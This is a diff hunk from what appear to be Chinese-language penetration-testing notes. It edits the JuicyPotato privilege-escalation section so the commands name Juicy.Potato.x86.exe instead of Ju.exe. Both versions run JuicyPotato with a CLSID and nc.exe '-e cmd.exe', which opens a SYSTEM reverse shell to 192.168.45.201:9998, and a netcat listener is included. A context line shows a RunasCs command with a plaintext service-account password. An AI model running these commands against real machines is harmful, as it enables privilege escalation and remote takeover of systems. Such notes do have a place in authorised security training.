@@ -679,8 +679,8 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\Users\Public\
 
 32.juicy-potato提权
 ```bash
-Ju.exe  -t  * -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" #先运行这个
+Juicy.Potato.x86.exe  -t  * -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" #先运行这个
 # 获取到-c后面的参数
-Ju.exe -l 4444 -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}#然后获取到对应的值再运行这个，记得替换-c后面的参数
+Juicy.Potato.x86.exe -l 4444 -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}#然后获取到对应的值再运行这个，记得替换-c后面的参数
 nc -lvp 9998 #本地开启监听
 ```
